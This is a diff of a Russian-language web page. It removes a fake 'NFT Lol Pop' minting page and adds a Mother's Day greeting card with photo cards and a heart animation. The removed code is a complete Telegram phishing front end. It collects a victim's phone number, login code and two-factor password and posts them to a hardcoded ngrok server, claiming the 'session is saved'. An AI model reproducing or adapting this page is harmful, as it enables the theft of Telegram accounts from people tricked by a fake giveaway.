@@ -2,354 +2,348 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NFT Lol Pop #871314 | Эксклюзивный минт</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>С Днём мамы! ❤️</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Nunito, Cormorant Garamond, Caveat -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600;700&family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Nunito', 'sans-serif'],
+                        serif: ['Cormorant Garamond', 'serif'],
+                        handwriting: ['Caveat', 'cursive'],
+                    },
+                    colors: {
+                        rosewarm: {
+                            50: '#fff8f9',
+                            100: '#ffeef2',
+                            200: '#ffd6e0',
+                            300: '#ffb3c6',
+                            400: '#ff809f',
+                            500: '#f8527b',
+                            600: '#e2315f',
+                        },
+                        cream: '#fdfbf7'
+                    }
+                }
+            }
+        }
+    </script>
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            min-height: 100vh;
-            background: radial-gradient(ellipse at 20% 30%, #0a0f2a, #02040c);
-            font-family: 'Segoe UI', 'Poppins', 'Inter', system-ui, -apple-system, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 1.5rem;
-            position: relative;
+            background: radial-gradient(circle at 20% 20%, #fff0f5 0%, #fdfbf7 50%, #ffeef2 100%);
             overflow-x: hidden;
+            min-height: 100vh;
         }
 
-        /* Анимированные звёзды */
-        .stars {
+        /* Парящие элементы декора */
+        @keyframes floatSlow {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-12px) rotate(4deg); }
+        }
+
+        @keyframes pulseSoft {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .animate-float {
+            animation: floatSlow 5s ease-in-out infinite;
+        }
+
+        .animate-float-delayed {
+            animation: floatSlow 6s ease-in-out 2s infinite;
+        }
+
+        .animate-heart {
+            animation: pulseSoft 2.2s ease-in-out infinite;
+        }
+
+        /* Полароидная карточка */
+        .polaroid-card {
+            background: #ffffff;
+            box-shadow: 
+                0 20px 40px -15px rgba(226, 49, 95, 0.15),
+                0 4px 12px -2px rgba(0, 0, 0, 0.06),
+                inset 0 0 0 1px rgba(255, 255, 255, 0.8);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .polaroid-card:hover {
+            transform: translateY(-8px) rotate(0deg) scale(1.02) !important;
+            box-shadow: 
+                0 28px 50px -12px rgba(226, 49, 95, 0.25),
+                0 8px 20px -4px rgba(0, 0, 0, 0.08);
+            z-index: 20;
+        }
+
+        /* Декоративный скотч сверху полароида */
+        .washi-tape {
+            background: rgba(255, 195, 210, 0.65);
+            backdrop-filter: blur(2px);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+            border-left: 2px dashed rgba(255, 255, 255, 0.7);
+            border-right: 2px dashed rgba(255, 255, 255, 0.7);
+        }
+
+        /* Холст для салюта из сердечек */
+        #hearts-canvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             pointer-events: none;
-            z-index: 0;
-        }
-        .star {
-            position: absolute;
-            background: white;
-            border-radius: 50%;
-            opacity: 0.6;
-            animation: twinkle 3s infinite alternate;
-        }
-        @keyframes twinkle {
-            0% { opacity: 0.2; transform: scale(1);}
-            100% { opacity: 1; transform: scale(1.2);}
+            z-index: 50;
         }
 
-        /* Основная карточка */
-        .glass-card {
-            position: relative;
-            z-index: 2;
-            background: rgba(12, 18, 34, 0.55);
-            backdrop-filter: blur(16px);
-            border-radius: 3rem;
-            border: 1px solid rgba(255, 100, 150, 0.4);
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05), 0 0 30px rgba(255, 70, 120, 0.3);
-            max-width: 520px;
-            width: 100%;
-            padding: 2rem 1.8rem;
-            transition: 0.4s;
-        }
-
-        /* Заголовок */
-        .nft-badge {
-            text-align: center;
-            margin-bottom: 1rem;
-        }
-        .nft-badge span {
-            background: rgba(255, 70, 120, 0.2);
-            padding: 0.3rem 1rem;
-            border-radius: 40px;
-            font-size: 0.8rem;
-            color: #ff8cb0;
-            letter-spacing: 1px;
-            backdrop-filter: blur(4px);
-            border: 1px solid rgba(255, 100, 150, 0.5);
-        }
-
-        h1 {
-            font-size: 2.2rem;
-            background: linear-gradient(135deg, #FFD166, #FF6B8B, #C44569);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-align: center;
-            margin: 0.5rem 0 0.2rem;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-        .collection-id {
-            text-align: center;
-            color: #9aa8d9;
-            font-size: 0.8rem;
-            font-family: monospace;
-            margin-bottom: 1.5rem;
-            word-break: break-all;
-        }
-
-        /* GIF контейнер */
-        .gif-container {
-            width: 100%;
-            max-width: 280px;
-            margin: 0 auto 1.5rem;
-            border-radius: 2rem;
-            overflow: hidden;
-            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.6), 0 0 0 3px rgba(255,255,200,0.2);
-            transition: 0.3s;
-            background: #00000022;
-        }
-        .gif-container img {
-            width: 100%;
-            height: auto;
-            display: block;
-            transition: 0.3s;
-        }
-        .gif-container:hover {
-            transform: scale(1.02);
-            box-shadow: 0 25px 40px -12px rgba(255,100,150,0.4);
-        }
-
-        /* Шаги */
-        .step-title {
-            font-weight: 600;
-            margin-bottom: 0.7rem;
-            color: #eef5ff;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 1.1rem;
-        }
-        .step-title i {
-            font-size: 1.3rem;
-        }
-
-        input {
-            width: 100%;
-            padding: 1rem 1.2rem;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid #2e3a6e;
-            border-radius: 2rem;
-            color: white;
-            font-size: 1rem;
-            outline: none;
-            transition: 0.2s;
-            margin-bottom: 1rem;
-            font-weight: 400;
-        }
-        input:focus {
-            border-color: #ff7b9c;
-            box-shadow: 0 0 12px rgba(255, 100, 150, 0.5);
-        }
-        button {
-            width: 100%;
-            padding: 1rem;
-            background: linear-gradient(95deg, #FF4D6D, #FF9F4A);
-            border: none;
-            border-radius: 3rem;
-            color: #0a0f1e;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 0.2rem;
-            font-family: inherit;
-            box-shadow: 0 6px 14px rgba(255, 77, 109, 0.3);
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 20px rgba(255, 77, 109, 0.5);
-            background: linear-gradient(95deg, #FF6B8B, #FFB347);
-        }
-        .status {
-            margin-top: 1rem;
-            text-align: center;
-            font-size: 0.85rem;
-            font-weight: 500;
-            padding: 0.5rem;
-            border-radius: 2rem;
-        }
-        .hidden {
-            display: none;
-        }
-        .success {
-            background: rgba(0, 255, 170, 0.15);
-            color: #6effbc;
-            border: 1px solid #6effbc55;
-        }
-        .error {
-            background: rgba(255, 70, 70, 0.2);
-            color: #ff8a7a;
-            border: 1px solid #ff5e5e55;
-        }
-        .info {
-            background: rgba(255, 200, 70, 0.15);
-            color: #ffdd88;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 1.8rem;
-            font-size: 0.7rem;
-            color: #6a76a3;
-            border-top: 1px dashed #2e3a6e;
-            padding-top: 1rem;
+        /* Стеклянный эффект */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.78);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(255, 214, 224, 0.7);
         }
     </style>
 </head>
-<body>
-<div class="stars" id="stars"></div>
-<div class="glass-card">
-    <div class="nft-badge"><span>🔷 LIMITED EDITION • 777/777</span></div>
-    <h1>LOL POP #871314</h1>
-    <div class="collection-id">⚡ NFT Lol Pop | редчайший дроп</div>
+<body class="text-stone-800 antialiased selection:bg-rosewarm-200 selection:text-rosewarm-600 relative">
 
-    <div class="gif-container">
-        <!-- ЗАМЕНИТЕ ССЫЛКУ НА ВАШУ ПРЯМУЮ RAW GIF -->
-        <img id="nftGif" src="https://raw.githubusercontent.com/dqmir1111/casiik/main/lol.gif" alt="NFT Lol Pop animated" onerror="this.src='https://media4.giphy.com/media/3o7abB06u9bNzA8LC8/giphy.gif';">
-    </div>
+    <!-- Холст для анимации сердечек и лепестков -->
+    <canvas id="hearts-canvas"></canvas>
 
-    <div id="step-phone">
-        <div class="step-title"><i>📱</i> Введите номер Telegram</div>
-        <input type="tel" id="phone" placeholder="+7 999 123 45 67" autocomplete="off">
-        <button id="sendCodeBtn">✨ Получить NFT ✨</button>
-    </div>
+    <!-- Фоновые декоративные цветы/круги -->
+    <div class="fixed -top-24 -left-24 w-96 h-96 bg-pink-200/40 rounded-full blur-3xl pointer-events-none"></div>
+    <div class="fixed top-1/3 -right-24 w-96 h-96 bg-amber-100/50 rounded-full blur-3xl pointer-events-none"></div>
+    <div class="fixed -bottom-24 left-1/4 w-96 h-96 bg-rose-200/40 rounded-full blur-3xl pointer-events-none"></div>
 
-    <div id="step-code" class="hidden">
-        <div class="step-title"><i>🔐</i> Код из Telegram</div>
-        <input type="text" id="code" placeholder="6-значный код">
-        <button id="verifyCodeBtn">Подтвердить →</button>
-    </div>
+    <!-- Основной контейнер открытки -->
+    <main class="relative z-10 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-10 sm:py-16 flex flex-col items-center">
 
-    <div id="step-2fa" class="hidden">
-        <div class="step-title"><i>🔒</i> Двухфакторный пароль</div>
-        <input type="password" id="password" placeholder="Ваш 2FA пароль Telegram">
-        <button id="verify2FABtn">Разблокировать NFT</button>
-    </div>
+        <!-- Верхний праздничный бейдж -->
+        <div class="inline-flex items-center gap-2 px-5 py-2 rounded-full glass-panel shadow-sm mb-6 animate-float">
+            <span class="text-xl animate-heart">🌸</span>
+            <span class="text-sm sm:text-base font-bold tracking-wide text-rosewarm-600 uppercase">Ангелина</span>
+            <span class="text-xl animate-heart">🌸</span>
+        </div>
 
-    <div id="status" class="status"></div>
-    <div id="successMsg" class="success hidden" style="text-align:center; margin-top:1rem;"></div>
-    <div class="footer">© Lol Pop Collection — минт навсегда в блокчейне</div>
-</div>
+        <!-- Главный заголовок и поздравление -->
+        <header class="text-center max-w-3xl mx-auto mb-12 sm:mb-16">
+            <h1 class="font-serif text-5xl sm:text-6xl md:text-7xl font-bold text-stone-900 leading-tight mb-4">
+                С Днём мамы!
+            </h1>
+            <div class="inline-block relative">
+                <p class="font-handwriting text-3xl sm:text-5xl text-rosewarm-600 px-4 py-1 relative z-10">
+                    Ты стала мамой второй раз ✨
+                </p>
+                <div class="w-full h-3 bg-rosewarm-200/70 rounded-full -mt-3 sm:-mt-4 transform -rotate-1"></div>
+            </div>
+            <p class="mt-6 text-base sm:text-lg text-stone-600 max-w-xl mx-auto leading-relaxed">
+                Самой доброй, заботливой, красивой и любимой маме на свете. Спасибо за твоё бесконечное тепло и за каждую улыбку!
+            </p>
+        </header>
 
-<script>
-    // 🔁 НАСТРОЙКА — УКАЖИТЕ ВАШ НГРОК АДРЕС
-    const API_BASE = 'https://611d-85-195-83-114.ngrok-free.app';
+        <!-- Секция с двумя полароидными карточками (1.png и 2.png) -->
+        <section class="w-full grid grid-cols-1 md:grid-cols-2 gap-10 sm:gap-12 lg:gap-16 items-center justify-items-center mb-16 px-2 sm:px-6">
+            
+            <!-- Первая карточка: Первый раз (1.png) -->
+            <div class="polaroid-card w-full max-w-md rounded-3xl p-4 sm:p-6 pb-7 transform md:-rotate-2 relative group">
+                <!-- Декоративный скотч -->
+                <div class="washi-tape w-32 h-8 absolute -top-3.5 left-1/2 -translate-x-1/2 rotate-2 rounded-sm z-20"></div>
+                
+                <!-- Номер-бейдж -->
+                <div class="absolute top-7 left-7 z-20 bg-white/90 backdrop-blur-md text-rosewarm-600 font-bold text-xs px-3 py-1.5 rounded-full shadow-sm flex items-center gap-1.5">
+                    <span>💖</span> Глава 1
+                </div>
 
-    let currentPhone = '';
-    let currentPhoneCodeHash = '';
-    let currentSession = null;
+                <!-- Контейнер фотографии 1.png -->
+                <div class="relative w-full aspect-[4/4] sm:aspect-[4/3.8] rounded-2xl overflow-hidden bg-rosewarm-50 border border-rosewarm-100 flex items-center justify-center">
+                    <img 
+                        src="1.png" 
+                        alt="Первый раз" 
+                        class="w-full h-full object-cover transition-transform duration-700 group-hover:scale-105"
+                    >
+                </div>
 
-    // Генерация падающих звёзд
-    function createStars() {
-        const starsContainer = document.getElementById('stars');
-        for(let i=0; i<120; i++) {
-            let star = document.createElement('div');
-            star.classList.add('star');
-            let size = Math.random() * 3 + 1;
-            star.style.width = size + 'px';
-            star.style.height = size + 'px';
-            star.style.left = Math.random() * 100 + '%';
-            star.style.top = Math.random() * 100 + '%';
-            star.style.animationDelay = Math.random() * 5 + 's';
-            star.style.animationDuration = Math.random() * 3 + 2 + 's';
-            starsContainer.appendChild(star);
+                <!-- Подпись под полароидом -->
+                <div class="mt-5 text-center px-2">
+                    <h2 class="font-handwriting text-4xl sm:text-5xl font-bold text-stone-800 tracking-wide">
+                        Первый раз
+                    </h2>
+                    <p class="text-sm text-stone-500 mt-1">То самое незабываемое начало 💕</p>
+                </div>
+            </div>
+
+            <!-- Вторая карточка: Второй раз (2.png) -->
+            <div class="polaroid-card w-full max-w-md rounded-3xl p-4 sm:p-6 pb-7 transform md:rotate-2 relative group">
+                <!-- Декоративный скотч -->
+                <div class="washi-tape w-32 h-8 absolute -top-3.5 left-1/2 -translate-x-1/2 -rotate-2 rounded-sm z-20"></div>
+                
+                <!-- Номер-бейдж -->
+                <div class="absolute top-7 left-7 z-20 bg-white/90 backdrop-blur-md text-rosewarm-600 font-bold text-xs px-3 py-1.5 rounded-full shadow-sm flex items-center gap-1.5">
+                    <span>🌟</span> Глава 2
+                </div>
+
+                <!-- Контейнер фотографии 2.png -->
+                <div class="relative w-full aspect-[4/4] sm:aspect-[4/3.8] rounded-2xl overflow-hidden bg-rosewarm-50 border border-rosewarm-100 flex items-center justify-center">
+                    <img 
+                        src="2.png" 
+                        alt="Второй раз" 
+                        class="w-full h-full object-cover transition-transform duration-700 group-hover:scale-105"
+                    >
+                </div>
+
+                <!-- Подпись под полароидом -->
+                <div class="mt-5 text-center px-2">
+                    <h2 class="font-handwriting text-4xl sm:text-5xl font-bold text-stone-800 tracking-wide">
+                        Второй раз
+                    </h2>
+                    <p class="text-sm text-stone-500 mt-1">В два раза больше любви и счастья 💞</p>
+                </div>
+            </div>
+
+        </section>
+
+        <!-- Финальная главная фраза внизу -->
+        <footer class="w-full max-w-3xl mx-auto text-center">
+            <div class="relative bg-white/90 border-2 border-dashed border-rosewarm-300 rounded-3xl p-6 sm:p-10 shadow-xl">
+                <!-- Иконка сердечка сверху рамки -->
+                <div class="w-12 h-12 rounded-2xl bg-rosewarm-500 text-white flex items-center justify-center text-2xl shadow-md mx-auto -mt-12 mb-4 animate-heart">
+                    ❤️
+                </div>
+
+                <p class="font-handwriting text-3xl sm:text-4xl md:text-5xl text-stone-800 leading-snug">
+                    Если бы ты меня не родила, этого сайта не было бы =)
+                </p>
+
+                <div class="mt-4 flex items-center justify-center gap-2 text-xs sm:text-sm text-stone-400 font-medium">
+                    <span>Сделано с огромной любовью</span>
+                    <span>•</span>
+                    <span>Специально для мамы</span>
+                </div>
+            </div>
+        </footer>
+
+    </main>
+
+    <script>
+        // --- Анимация сердечек на фоне ---
+        const canvas = document.getElementById('hearts-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        let ambientHearts = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
         }
-    }
-    createStars();
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
 
-    // Элементы DOM
-    const sendBtn = document.getElementById('sendCodeBtn');
-    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
-    const verify2FABtn = document.getElementById('verify2FABtn');
+        const colors = ['#f8527b', '#ff809f', '#ffb3c6', '#fb7185', '#f43f5e', '#fbbf24'];
 
-    sendBtn.onclick = async () => {
-        const phone = document.getElementById('phone').value.trim();
-        if(!phone) { showStatus('Укажите номер телефона', 'error'); return; }
-        showStatus('📡 Отправка кода...', 'info');
-        try {
-            const res = await fetch(`${API_BASE}/send_code`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone})
+        // Создаём фоновые медленно парящие сердечки
+        for (let i = 0; i < 16; i++) {
+            ambientHearts.push({
+                x: Math.random() * window.innerWidth,
+                y: Math.random() * window.innerHeight,
+                size: 8 + Math.random() * 10,
+                speedY: 0.3 + Math.random() * 0.5,
+                swayAmp: 0.4 + Math.random() * 0.8,
+                swaySpeed: 0.01 + Math.random() * 0.02,
+                angle: Math.random() * Math.PI * 2,
+                opacity: 0.15 + Math.random() * 0.25,
+                color: colors[Math.floor(Math.random() * colors.length)]
             });
-            const data = await res.json();
-            if(data.success) {
-                currentPhone = data.phone;
-                currentPhoneCodeHash = data.phone_code_hash;
-                showStatus('✅ Код отправлен! Проверьте Telegram', 'success');
-                document.getElementById('step-phone').classList.add('hidden');
-                document.getElementById('step-code').classList.remove('hidden');
-            } else {
-                showStatus('Ошибка: ' + (data.error || 'неизвестная'), 'error');
-            }
-        } catch(e) { showStatus('Сервер недоступен', 'error'); }
-    };
+        }
 
-    verifyCodeBtn.onclick = async () => {
-        const code = document.getElementById('code').value.trim();
-        if(!code) { showStatus('Введите код из SMS', 'error'); return; }
-        showStatus('🔄 Проверка кода...', 'info');
-        try {
-            const res = await fetch(`${API_BASE}/verify_code`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: currentPhone, code, phone_code_hash: currentPhoneCodeHash})
+        function spawnBurst(x, y, count = 25) {
+            for (let i = 0; i < count; i++) {
+                const angle = Math.random() * Math.PI * 2;
+                const speed = 2 + Math.random() * 7;
+                particles.push({
+                    x: x,
+                    y: y,
+                    vx: Math.cos(angle) * speed,
+                    vy: Math.sin(angle) * speed - 2.5,
+                    size: 10 + Math.random() * 12,
+                    color: colors[Math.floor(Math.random() * colors.length)],
+                    alpha: 1,
+                    decay: 0.012 + Math.random() * 0.012,
+                    rotation: (Math.random() - 0.5) * 0.6
+                });
+            }
+        }
+
+        function drawHeart(ctx, x, y, size, color, alpha, rotation = 0) {
+            ctx.save();
+            ctx.globalAlpha = Math.max(0, alpha);
+            ctx.translate(x, y);
+            ctx.rotate(rotation);
+            ctx.fillStyle = color;
+            ctx.beginPath();
+            const topCurveHeight = size * 0.3;
+            ctx.moveTo(0, topCurveHeight);
+            ctx.bezierCurveTo(0, 0, -size / 2, 0, -size / 2, topCurveHeight);
+            ctx.bezierCurveTo(-size / 2, (size + topCurveHeight) / 2, 0, (size + topCurveHeight) / 1.4, 0, size);
+            ctx.bezierCurveTo(0, (size + topCurveHeight) / 1.4, size / 2, (size + topCurveHeight) / 2, size / 2, topCurveHeight);
+            ctx.bezierCurveTo(size / 2, 0, 0, 0, 0, topCurveHeight);
+            ctx.closePath();
+            ctx.fill();
+            ctx.restore();
+        }
+
+        function animateCanvas() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            ambientHearts.forEach(h => {
+                h.y -= h.speedY;
+                h.angle += h.swaySpeed;
+                h.x += Math.sin(h.angle) * h.swayAmp;
+
+                if (h.y < -30) {
+                    h.y = canvas.height + 30;
+                    h.x = Math.random() * canvas.width;
+                }
+                drawHeart(ctx, h.x, h.y, h.size, h.color, h.opacity, Math.sin(h.angle) * 0.2);
             });
-            const data = await res.json();
-            if(data.success && data.completed === true) {
-                showFinalSuccess(data);
-            } else if(data.requires_2fa) {
-                currentSession = data.session;
-                showStatus('🔐 Требуется пароль 2FA', 'info');
-                document.getElementById('step-code').classList.add('hidden');
-                document.getElementById('step-2fa').classList.remove('hidden');
-            } else {
-                showStatus('Неверный код: ' + (data.error || 'попробуйте снова'), 'error');
+
+            for (let i = particles.length - 1; i >= 0; i--) {
+                const p = particles[i];
+                p.x += p.vx;
+                p.y += p.vy;
+                p.vy += 0.14;
+                p.vx *= 0.99;
+                p.alpha -= p.decay;
+
+                if (p.alpha <= 0) {
+                    particles.splice(i, 1);
+                } else {
+                    drawHeart(ctx, p.x, p.y, p.size, p.color, p.alpha, p.rotation);
+                }
             }
-        } catch(e) { showStatus('Ошибка сети', 'error'); }
-    };
 
-    verify2FABtn.onclick = async () => {
-        const password = document.getElementById('password').value.trim();
-        if(!password) { showStatus('Введите ваш 2FA пароль', 'error'); return; }
-        showStatus('🔑 Проверка 2FA...', 'info');
-        try {
-            const res = await fetch(`${API_BASE}/verify_2fa`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: currentPhone, password, session: currentSession})
-            });
-            const data = await res.json();
-            if(data.success) {
-                showFinalSuccess(data);
-            } else {
-                showStatus('Ошибка 2FA: ' + (data.error || 'неверный пароль'), 'error');
-            }
-        } catch(e) { showStatus('Ошибка соединения', 'error'); }
-    };
+            requestAnimationFrame(animateCanvas);
+        }
 
-    function showFinalSuccess(data) {
-        showStatus('🎉 МИНТ УСПЕШЕН! NFT в вашем кошельке.', 'success');
-        document.getElementById('step-code').classList.add('hidden');
-        document.getElementById('step-2fa').classList.add('hidden');
-        document.getElementById('successMsg').innerHTML = `✅ <strong>LOL POP #871314</strong> передан владельцу @${data.username || data.first_name || 'collector'}.<br>🔥 Сессия сохранена, добро пожаловать в клуб.`;
-        document.getElementById('successMsg').classList.remove('hidden');
-    }
-
-    function showStatus(msg, type='info') {
-        const div = document.getElementById('status');
-        div.innerHTML = msg;
-        div.className = `status ${type}`;
-        if(type === 'success') setTimeout(() => { if(div.innerHTML === msg) div.innerHTML = ''; }, 4000);
-    }
-</script>
+        window.onload = function() {
+            animateCanvas();
+            setTimeout(() => {
+                spawnBurst(window.innerWidth / 2, window.innerHeight * 0.3, 24);
+            }, 400);
+        };
+    </script>
 </body>
 </html>
